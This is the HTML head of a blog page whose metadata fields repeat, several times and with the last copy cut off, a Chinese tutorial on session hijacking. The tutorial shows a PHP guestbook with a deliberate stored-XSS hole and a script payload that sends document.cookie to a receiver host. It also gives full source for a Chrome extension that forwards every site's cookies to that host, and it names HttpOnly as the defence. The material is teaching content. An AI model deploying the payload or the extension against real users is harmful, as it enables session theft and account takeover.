<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Session劫持原理，技术实现与防范_Web开发</title>
    <meta name="description" content="    Session劫持原理，技术实现与防范                                                                                 (转载附原文链接：http://jahng.cn/node/58)今天4月1号( 这篇博客写了两个晚上 )...">

    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <!-- <script src="https://kit.fontawesome.com/bff30092be.js" crossorigin="anonymous"></script> -->
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1096581_7o3r6v7yzsh.css">
    <link rel="stylesheet" href="/assets/css/main.css ">
    <link rel="canonical" href="https://tldsn.github.io/2020/07/07/Session%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86-%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83_Web%E5%BC%80%E5%8F%91/">
    <link rel="alternate" type="application/rss+xml" title="TLDSN" href="https://tldsn.github.io/feed.xml ">
    <link type="application/atom+xml" rel="alternate" href="https://tldsn.github.io/feed.xml" title="TLDSN" />
    <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>Session劫持原理，技术实现与防范_Web开发 | TLDSN</title>
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="Session劫持原理，技术实现与防范_Web开发" />
<meta name="author" content="tldsn" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Session劫持原理，技术实现与防范 (转载附原文链接：http://jahng.cn/node/58) 今天4月1号( 这篇博客写了两个晚上 )，下午公司没有像往常一样放眼保健操的音乐，而是放了二十分钟张国荣的歌，挺赞的！ 看了吴翰清的《白帽子讲Web安全》这本书的认证与会话管理这一章的内容，所以写这篇读书笔记。在看懂了书上提到的知识点的基础上，加上一些自己的理解，再通过代码实现，来记录一下自己对 session 安全的理解。 一般的 Web 登陆认证实现方案是，用户认证登录通过后，在服务端维护在线用户的 Session ，用户下次访问网站的时候，只要告诉服务器使用哪一个session就行，浏览器是通过把当前用户的SessionID告诉服务器，服务器则是通过这个SessionID来识别当前用户的session，因为http是无状态的，所以一般的做法是将SessionID保存在cookie中。 SessionID是用户登陆之后才有的（假设网站上没有未登录的情况使用session），而服务端又是通过SessionID来认证当前登录用户，所以如果这个SessionID在生命周期内被别人窃取，那么攻击的人就可以直接使用这个SessionID来登录账号，不需要在攻击登录过程（比如暴力破解密码等），这就是Session劫持。 那么，如何实现Session劫持呢？ 第一种方法： 上面提到了，SessionID常常保存在cookie里面，cookie是存在客户端浏览器的，所以我们可以使用XSS来获取用户的SessionID。 场景：假设有一个网站，这个网站需要一个留言板的功能，登录的用户可以在这个留言板留言，并且所有登录用户都可以浏览留言列表。公司技术老大觉得这个功能太简单了，就决定让一个刚毕业没有任何项目经验的小雏鹰来做这个功能。然后小雏鹰很快完成了。如下代码： &lt;?php &nbsp;&nbsp;&nbsp;&nbsp;session_start();//假设用户已经登录 &nbsp;&nbsp;&nbsp;&nbsp;if(isset($_GET[&#39;message&#39;])){&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//把数据存数据库，没有任何验证，过滤或者转义 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents(&#39;message.log&#39;,$_GET[&#39;message&#39;].&quot;\r\n&quot;,FILE_APPEND); &nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;$messageList&nbsp;=&nbsp;explode(&quot;\r\n&quot;,trim(file_get_contents(&#39;message.log&#39;),&quot;\r\n&quot;)); ?&gt; &lt;html&gt; &nbsp;&nbsp;&nbsp;&nbsp;&lt;head&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;meta&nbsp;charset=&quot;utf-8&quot;/&gt; &nbsp;&nbsp;&nbsp;&nbsp;&lt;/head&gt; &nbsp;&nbsp;&nbsp;&nbsp;&lt;body&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;form&nbsp;action=&quot;&quot;&nbsp;method=&quot;get&quot;&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;textarea&nbsp;name=&quot;message&quot;&nbsp;cols=&quot;30&quot;&nbsp;rows=&quot;10&quot;&gt;&lt;/textarea&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type=&quot;submit&quot;&nbsp;value=&quot;留言&quot;&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/form&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;ul&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;foreach($messageList&nbsp;as&nbsp;$message){&nbsp;?&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&lt;?php&nbsp;echo&nbsp;$message;&nbsp;?&gt;&lt;/li&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;}&nbsp;?&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/ul&gt; &nbsp;&nbsp;&nbsp;&nbsp;&lt;/body&gt; &lt;/html&gt;功能做好了，然后有一个老鸟骇客通过观察发现了这个网站存在XSS漏洞，然后他准备通过这个漏洞来获取这个网站登录用户的SessionID。 首先简单实现一个Cookie接收器,假设域名接收器的访问链接是：https://www.test.com/getCookie.php &lt;?php $cookie&nbsp;=&nbsp;$_GET[&#39;cookie&#39;]; //&nbsp;后面的代码就是把cookie写入数据库然后他在该网站上注册了个账号，并在留言板留言了，留言的内容如下： &lt;script&gt;window.location.href&nbsp;=&nbsp;&#39;https://www.test.com/getCookie.php?cookie=&#39;&nbsp;+&nbsp;document.cookie;&lt;/script&gt;一切都准备妥当了，最后，其他登录用户访问留言列表页的时候，这段XSS Payload被浏览器解析执行，跳转到https://www.test.com/getCookie.php这个链接，并把当前用户的cooie也带过去了。 https://www.test.com/getCookie.php?cookie=PHPSESSID=8jbvd2vqqb2ojfnioplatklor2这个时候，攻击者就可以使用这个SessionID登录用户的账号了。 第二种方法 chrome扩展是用来扩展chrome浏览器功能的,比如屏幕截图等。很多用户都会使用各种各样的扩展来简化自己的工作，开发人员（比如我）也可以自己开发自己的扩展用来简化自己的开发工作。但是非技术人员很少开率一个chrome的扩展是否安全。chrome是可以读取用户浏览器的cookie的，我这里实现一下如何使用chrome extension来实现session劫持。 首先来开发一个chrome extension,功能是用来窃取用户客户端浏览器的cookie。 创建一个文件夹叫session_hijacking，以下文件都保存在这个文件夹。 先定义manifest.json文件，这个文件是定义chrome扩展以及一些权限配置。 { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;manifest_version&quot;:&nbsp;2, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;name&quot;:&nbsp;&quot;Session&nbsp;Hijacking&nbsp;Demo&quot;, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;version&quot;:&nbsp;&quot;1.0.0.0&quot;, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;content_scripts&quot;:[{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;matches&quot;:[&quot;http://*/*&quot;,&quot;https://*/*&quot;], &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;js&quot;:[&quot;jquery-1.8.3.min.js&quot;,&quot;content.js&quot;]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}], &nbsp;&nbsp;&nbsp;&nbsp;&quot;background&quot;:{ &nbsp;&nbsp;&nbsp;&nbsp;&quot;scripts&quot;:[&quot;jquery-1.8.3.min.js&quot;,&quot;background.js&quot;] &nbsp;&nbsp;&nbsp;&nbsp;} }然后写一个content.js，这个是嵌入到网页的脚本文件，在这个文件里面我们通过js获取客户端的cookie，然后传递给background.js这个文件做处理，这个文件是干嘛的？下一步说明。 var&nbsp;msg&nbsp;=&nbsp;{ cookie:&nbsp;document.cookie, }; //chrome.runtime.sendMessage&nbsp;这个函数向&nbsp;background.js&nbsp;请求数据&nbsp; chrome.runtime.sendMessage(msg);接着我们写一个background.js文件，这个文件是后台脚本，可以简单理解为后台程序，通过这个文件我们跟服务器交互，所以background.js的代码主要实现，从content.js获取用户客户端cookie，然后发送给服务器端的cookie接收器。 //chrome.runtime.onMessage.addListener&nbsp;这个函数监听content.js&nbsp;的请求 chrome.runtime.onMessage.addListener(function(request,&nbsp;sender,&nbsp;sendRequest){&nbsp;&nbsp; var&nbsp;cookie&nbsp;=&nbsp;request.cookie; &nbsp;&nbsp;$.ajax({ &nbsp;&nbsp;&nbsp;&nbsp;method:&#39;get&#39;, &nbsp;&nbsp;&nbsp;&nbsp;url:&#39;http://www.test.com/getCookie.php&#39;, &nbsp;&nbsp;&nbsp;&nbsp;data:&nbsp;&#39;cookie=&#39;+cookie, &nbsp;&nbsp;&nbsp;&nbsp;success:function(data){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(data); &nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;}); })因为我们依赖了jquery，所以把jquery-1.8.3.min.js文件也放到session_hijacking目录下面，最后我们的目录结构应该是这样的： 然后把session_hijacking文件夹拖到chrome的设置页面的扩展程序安装，如图所示： chrome extension准备好了，然后我们要在www.test.com对应的服务端开发一个cookie接收器，文件名叫getCookie.php &lt;?php $cookie&nbsp;=&nbsp;$_GET[&#39;cookie&#39;]; //&nbsp;后面的代码就是把cookie写入数据库 echo&nbsp;&#39;Session劫持成功，服务器端成功保存该用户的Cookie！&#39;.$cookie;最后我们使用csdn做测试（又是csdn，之前我演示CSRF的时候就是用csdn做小白鼠的）。登录csdn，打开chrome extension的背景页，我们可以看到控制台如下信息： 所以呢，chrome extension不要随便乱用了。 总结，上面演示的两种方法其实原理都是一样的，就是使用各种手段通过 js 获取用户客户端的cookie，所以防范这种情况，我们可以通过设置cookie HttpOnly 来防止客户端js获取到cookie。比如drupal的网站就不能通过js获取到对应的SessionID，不信你看下图： 这个是通过浏览器调试工具看到的cookie： 这个是通过document.cookie获取到的cookie： 我们复制这个SessionID我们看到内容如下，使用了HttpOnly： SESS7e15773ea34aa5ed2304263fc16a295e=RWE-6_ADzeBuw0rZT6Ef6GGmgTuSSTrp6XO-c8688gs;&nbsp;expires=Sat,&nbsp;22&nbsp;Apr&nbsp;2017&nbsp;18:52:50&nbsp;GMT;&nbsp;path=/;&nbsp;domain=.test.com;&nbsp;HttpOnly" />
<meta property="og:description" content="Session劫持原理，技术实现与防范 (转载附原文链接：http://jahng.cn/node/58) 今天4月1号( 这篇博客写了两个晚上 )，下午公司没有像往常一样放眼保健操的音乐，而是放了二十分钟张国荣的歌，挺赞的！ 看了吴翰清的《白帽子讲Web安全》这本书的认证与会话管理这一章的内容，所以写这篇读书笔记。在看懂了书上提到的知识点的基础上，加上一些自己的理解，再通过代码实现，来记录一下自己对 session 安全的理解。 一般的 Web 登陆认证实现方案是，用户认证登录通过后，在服务端维护在线用户的 Session ，用户下次访问网站的时候，只要告诉服务器使用哪一个session就行，浏览器是通过把当前用户的SessionID告诉服务器，服务器则是通过这个SessionID来识别当前用户的session，因为http是无状态的，所以一般的做法是将SessionID保存在cookie中。 SessionID是用户登陆之后才有的（假设网站上没有未登录的情况使用session），而服务端又是通过SessionID来认证当前登录用户，所以如果这个SessionID在生命周期内被别人窃取，那么攻击的人就可以直接使用这个SessionID来登录账号，不需要在攻击登录过程（比如暴力破解密码等），这就是Session劫持。 那么，如何实现Session劫持呢？ 第一种方法： 上面提到了，SessionID常常保存在cookie里面，cookie是存在客户端浏览器的，所以我们可以使用XSS来获取用户的SessionID。 场景：假设有一个网站，这个网站需要一个留言板的功能，登录的用户可以在这个留言板留言，并且所有登录用户都可以浏览留言列表。公司技术老大觉得这个功能太简单了，就决定让一个刚毕业没有任何项目经验的小雏鹰来做这个功能。然后小雏鹰很快完成了。如下代码： &lt;?php &nbsp;&nbsp;&nbsp;&nbsp;session_start();//假设用户已经登录 &nbsp;&nbsp;&nbsp;&nbsp;if(isset($_GET[&#39;message&#39;])){&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//把数据存数据库，没有任何验证，过滤或者转义 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents(&#39;message.log&#39;,$_GET[&#39;message&#39;].&quot;\r\n&quot;,FILE_APPEND); &nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;$messageList&nbsp;=&nbsp;explode(&quot;\r\n&quot;,trim(file_get_contents(&#39;message.log&#39;),&quot;\r\n&quot;)); ?&gt; &lt;html&gt; &nbsp;&nbsp;&nbsp;&nbsp;&lt;head&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;meta&nbsp;charset=&quot;utf-8&quot;/&gt; &nbsp;&nbsp;&nbsp;&nbsp;&lt;/head&gt; &nbsp;&nbsp;&nbsp;&nbsp;&lt;body&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;form&nbsp;action=&quot;&quot;&nbsp;method=&quot;get&quot;&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;textarea&nbsp;name=&quot;message&quot;&nbsp;cols=&quot;30&quot;&nbsp;rows=&quot;10&quot;&gt;&lt;/textarea&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type=&quot;submit&quot;&nbsp;value=&quot;留言&quot;&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/form&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;ul&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;foreach($messageList&nbsp;as&nbsp;$message){&nbsp;?&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&lt;?php&nbsp;echo&nbsp;$message;&nbsp;?&gt;&lt;/li&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;}&nbsp;?&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/ul&gt; &nbsp;&nbsp;&nbsp;&nbsp;&lt;/body&gt; &lt;/html&gt;功能做好了，然后有一个老鸟骇客通过观察发现了这个网站存在XSS漏洞，然后他准备通过这个漏洞来获取这个网站登录用户的SessionID。 首先简单实现一个Cookie接收器,假设域名接收器的访问链接是：https://www.test.com/getCookie.php &lt;?php $cookie&nbsp;=&nbsp;$_GET[&#39;cookie&#39;]; //&nbsp;后面的代码就是把cookie写入数据库然后他在该网站上注册了个账号，并在留言板留言了，留言的内容如下： &lt;script&gt;window.location.href&nbsp;=&nbsp;&#39;https://www.test.com/getCookie.php?cookie=&#39;&nbsp;+&nbsp;document.cookie;&lt;/script&gt;一切都准备妥当了，最后，其他登录用户访问留言列表页的时候，这段XSS Payload被浏览器解析执行，跳转到https://www.test.com/getCookie.php这个链接，并把当前用户的cooie也带过去了。 https://www.test.com/getCookie.php?cookie=PHPSESSID=8jbvd2vqqb2ojfnioplatklor2这个时候，攻击者就可以使用这个SessionID登录用户的账号了。 第二种方法 chrome扩展是用来扩展chrome浏览器功能的,比如屏幕截图等。很多用户都会使用各种各样的扩展来简化自己的工作，开发人员（比如我）也可以自己开发自己的扩展用来简化自己的开发工作。但是非技术人员很少开率一个chrome的扩展是否安全。chrome是可以读取用户浏览器的cookie的，我这里实现一下如何使用chrome extension来实现session劫持。 首先来开发一个chrome extension,功能是用来窃取用户客户端浏览器的cookie。 创建一个文件夹叫session_hijacking，以下文件都保存在这个文件夹。 先定义manifest.json文件，这个文件是定义chrome扩展以及一些权限配置。 { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;manifest_version&quot;:&nbsp;2, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;name&quot;:&nbsp;&quot;Session&nbsp;Hijacking&nbsp;Demo&quot;, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;version&quot;:&nbsp;&quot;1.0.0.0&quot;, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;content_scripts&quot;:[{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;matches&quot;:[&quot;http://*/*&quot;,&quot;https://*/*&quot;], &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;js&quot;:[&quot;jquery-1.8.3.min.js&quot;,&quot;content.js&quot;]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}], &nbsp;&nbsp;&nbsp;&nbsp;&quot;background&quot;:{ &nbsp;&nbsp;&nbsp;&nbsp;&quot;scripts&quot;:[&quot;jquery-1.8.3.min.js&quot;,&quot;background.js&quot;] &nbsp;&nbsp;&nbsp;&nbsp;} }然后写一个content.js，这个是嵌入到网页的脚本文件，在这个文件里面我们通过js获取客户端的cookie，然后传递给background.js这个文件做处理，这个文件是干嘛的？下一步说明。 var&nbsp;msg&nbsp;=&nbsp;{ cookie:&nbsp;document.cookie, }; //chrome.runtime.sendMessage&nbsp;这个函数向&nbsp;background.js&nbsp;请求数据&nbsp; chrome.runtime.sendMessage(msg);接着我们写一个background.js文件，这个文件是后台脚本，可以简单理解为后台程序，通过这个文件我们跟服务器交互，所以background.js的代码主要实现，从content.js获取用户客户端cookie，然后发送给服务器端的cookie接收器。 //chrome.runtime.onMessage.addListener&nbsp;这个函数监听content.js&nbsp;的请求 chrome.runtime.onMessage.addListener(function(request,&nbsp;sender,&nbsp;sendRequest){&nbsp;&nbsp; var&nbsp;cookie&nbsp;=&nbsp;request.cookie; &nbsp;&nbsp;$.ajax({ &nbsp;&nbsp;&nbsp;&nbsp;method:&#39;get&#39;, &nbsp;&nbsp;&nbsp;&nbsp;url:&#39;http://www.test.com/getCookie.php&#39;, &nbsp;&nbsp;&nbsp;&nbsp;data:&nbsp;&#39;cookie=&#39;+cookie, &nbsp;&nbsp;&nbsp;&nbsp;success:function(data){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(data); &nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;}); })因为我们依赖了jquery，所以把jquery-1.8.3.min.js文件也放到session_hijacking目录下面，最后我们的目录结构应该是这样的： 然后把session_hijacking文件夹拖到chrome的设置页面的扩展程序安装，如图所示： chrome extension准备好了，然后我们要在www.test.com对应的服务端开发一个cookie接收器，文件名叫getCookie.php &lt;?php $cookie&nbsp;=&nbsp;$_GET[&#39;cookie&#39;]; //&nbsp;后面的代码就是把cookie写入数据库 echo&nbsp;&#39;Session劫持成功，服务器端成功保存该用户的Cookie！&#39;.$cookie;最后我们使用csdn做测试（又是csdn，之前我演示CSRF的时候就是用csdn做小白鼠的）。登录csdn，打开chrome extension的背景页，我们可以看到控制台如下信息： 所以呢，chrome extension不要随便乱用了。 总结，上面演示的两种方法其实原理都是一样的，就是使用各种手段通过 js 获取用户客户端的cookie，所以防范这种情况，我们可以通过设置cookie HttpOnly 来防止客户端js获取到cookie。比如drupal的网站就不能通过js获取到对应的SessionID，不信你看下图： 这个是通过浏览器调试工具看到的cookie： 这个是通过document.cookie获取到的cookie： 我们复制这个SessionID我们看到内容如下，使用了HttpOnly： SESS7e15773ea34aa5ed2304263fc16a295e=RWE-6_ADzeBuw0rZT6Ef6GGmgTuSSTrp6XO-c8688gs;&nbsp;expires=Sat,&nbsp;22&nbsp;Apr&nbsp;2017&nbsp;18:52:50&nbsp;GMT;&nbsp;path=/;&nbsp;domain=.test.com;&nbsp;HttpOnly" />
<link rel="canonical" href="https://tldsn.github.io/2020/07/07/Session%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86-%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83_Web%E5%BC%80%E5%8F%91/" />
<meta property="og:url" content="https://tldsn.github.io/2020/07/07/Session%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86-%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83_Web%E5%BC%80%E5%8F%91/" />
<meta property="og:site_name" content="TLDSN" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-07-07T00:00:00+08:00" />
<script type="application/ld+json">
{"mainEntityOfPage":{"@type":"WebPage","@id":"https://tldsn.github.io/2020/07/07/Session%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86-%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83_Web%E5%BC%80%E5%8F%91/"},"url":"https://tldsn.github.io/2020/07/07/Session%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86-%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83_Web%E5%BC%80%E5%8F%91/","author":{"@type":"Person","name":"tldsn"},"description":"Session劫持原理，技术实现与防范 (转载附原文链接：http://jahng.cn/node/58) 今天4月1号( 这篇博客写了两个晚上 )，下午公司没有像往常一样放眼保健操的音乐，而是放了二十分钟张国荣的歌，挺赞的！ 看了吴翰清的《白帽子讲Web安全》这本书的认证与会话管理这一章的内容，所以写这篇读书笔记。在看懂了书上提到的知识点的基础上，加上一些自己的理解，再通过代码实现，来记录一下自己对 session 安全的理解。 一般的 Web 登陆认证实现方案是，用户认证登录通过后，在服务端维护在线用户的 Session ，用户下次访问网站的时候，只要告诉服务器使用哪一个session就行，浏览器是通过把当前用户的SessionID告诉服务器，服务器则是通过这个SessionID来识别当前用户的session，因为http是无状态的，所以一般的做法是将SessionID保存在cookie中。 SessionID是用户登陆之后才有的（假设网站上没有未登录的情况使用session），而服务端又是通过SessionID来认证当前登录用户，所以如果这个SessionID在生命周期内被别人窃取，那么攻击的人就可以直接使用这个SessionID来登录账号，不需要在攻击登录过程（比如暴力破解密码等），这就是Session劫持。 那么，如何实现Session劫持呢？ 第一种方法： 上面提到了，SessionID常常保存在cookie里面，cookie是存在客户端浏览器的，所以我们可以使用XSS来获取用户的SessionID。 场景：假设有一个网站，这个网站需要一个留言板的功能，登录的用户可以在这个留言板留言，并且所有登录用户都可以浏览留言列表。公司技术老大觉得这个功能太简单了，就决定让一个刚毕业没有任何项目经验的小雏鹰来做这个功能。然后小雏鹰很快完成了。如下代码： &lt;?php &nbsp;&nbsp;&nbsp;&nbsp;session_start();//假设用户已经登录 &nbsp;&nbsp;&nbsp;&nbsp;if(isset($_GET[&#39;message&#39;])){&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//把数据存数据库，没有任何验证，过滤或者转义 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents(&#39;message.log&#39;,$_GET[&#39;message&#39;].&quot;\\r\\n&quot;,FILE_APPEND); &nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;$messageList&nbsp;=&nbsp;explode(&quot;\\r\\n&quot;,trim(file_get_contents(&#39;message.log&#39;),&quot;\\r\\n&quot;)); ?&gt; &lt;html&gt; &nbsp;&nbsp;&nbsp;&nbsp;&lt;head&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;meta&nbsp;charset=&quot;utf-8&quot;/&gt; &nbsp;&nbsp;&nbsp;&nbsp;&lt;/head&gt; &nbsp;&nbsp;&nbsp;&nbsp;&lt;body&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;form&nbsp;action=&quot;&quot;&nbsp;method=&quot;get&quot;&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;textarea&nbsp;name=&quot;message&quot;&nbsp;cols=&quot;30&quot;&nbsp;rows=&quot;10&quot;&gt;&lt;/textarea&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type=&quot;submit&quot;&nbsp;value=&quot;留言&quot;&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/form&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;ul&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;foreach($messageList&nbsp;as&nbsp;$message){&nbsp;?&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&lt;?php&nbsp;echo&nbsp;$message;&nbsp;?&gt;&lt;/li&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;}&nbsp;?&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/ul&gt; &nbsp;&nbsp;&nbsp;&nbsp;&lt;/body&gt; &lt;/html&gt;功能做好了，然后有一个老鸟骇客通过观察发现了这个网站存在XSS漏洞，然后他准备通过这个漏洞来获取这个网站登录用户的SessionID。 首先简单实现一个Cookie接收器,假设域名接收器的访问链接是：https://www.test.com/getCookie.php &lt;?php $cookie&nbsp;=&nbsp;$_GET[&#39;cookie&#39;]; //&nbsp;后面的代码就是把cookie写入数据库然后他在该网站上注册了个账号，并在留言板留言了，留言的内容如下： &lt;script&gt;window.location.href&nbsp;=&nbsp;&#39;https://www.test.com/getCookie.php?cookie=&#39;&nbsp;+&nbsp;document.cookie;&lt;/script&gt;一切都准备妥当了，最后，其他登录用户访问留言列表页的时候，这段XSS Payload被浏览器解析执行，跳转到https://www.test.com/getCookie.php这个链接，并把当前用户的cooie也带过去了。 https://www.test.com/getCookie.php?cookie=PHPSESSID=8jbvd2vqqb2ojfnioplatklor2这个时候，攻击者就可以使用这个SessionID登录用户的账号了。 第二种方法 chrome扩展是用来扩展chrome浏览器功能的,比如屏幕截图等。很多用户都会使用各种各样的扩展来简化自己的工作，开发人员（比如我）也可以自己开发自己的扩展用来简化自己的开发工作。但是非技术人员很少开率一个chrome的扩展是否安全。chrome是可以读取用户浏览器的cookie的，我这里实现一下如何使用chrome extension来实现session劫持。 首先来开发一个chrome extension,功能是用来窃取用户客户端浏览器的cookie。 创建一个文件夹叫session_hijacking，以下文件都保存在这个文件夹。 先定义manifest.json文件，这个文件是定义chrome扩展以及一些权限配置。 { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;manifest_version&quot;:&nbsp;2, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;name&quot;:&nbsp;&quot;Session&nbsp;Hijacking&nbsp;Demo&quot;, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;version&quot;:&nbsp;&quot;1.0.0.0&quot;, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;content_scripts&quot;:[{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;matches&quot;:[&quot;http://*/*&quot;,&quot;https://*/*&quot;], &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;js&quot;:[&quot;jquery-1.8.3.min.js&quot;,&quot;content.js&quot;]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}], 